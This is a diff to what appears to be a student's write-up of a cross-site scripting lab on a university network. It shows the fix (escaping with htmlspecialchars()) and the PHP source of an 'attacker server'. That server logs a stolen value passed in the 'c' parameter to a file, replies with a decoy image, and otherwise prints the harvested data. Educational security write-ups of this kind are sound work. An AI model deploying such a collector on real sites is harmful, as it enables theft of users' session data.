@@ -41,7 +41,7 @@ The attacker could post an image that fails to load, forcing JS to run. In this 
 
 If you're on the Taylor University network, you can view the result of this attack by visiting [10.121.20.103/hackme-xss.php](http://10.121.20.103/hackme-xss.php)
 
-In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.
+In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars()` function in PHP when rendering the user submitted content.
 
 The source code of the attacker server is as follows:
 
@@ -49,16 +49,17 @@ The source code of the attacker server is as follows:
 <?php
 $secretFile = "/tmp/foo.txt";
 if (isset($_GET['c'])) {
-	$fh = fopen($secretFile, 'a') or die("can’t open file");	
-	$stringData = $_GET['c']."\n";
-	fwrite($fh, $stringData);
-	fclose($fh);
+        $fh = fopen($secretFile, 'a') or die("can’t open file");
+        $stringData = $_GET['c']."\n";
+        fwrite($fh, $stringData);
+        fclose($fh);
 
-	//Send an img
-	header("Content-Type: image/png");
+        //Send an img
+        header('Content-Type: image/jpeg');
+        readfile("kitten.jpg");
 } else {
-	header("Content-Type: text/plain");
-	readfile($secretFile);
+        header("Content-Type: text/plain");
+        readfile($secretFile);
 }
 ?>
 ```
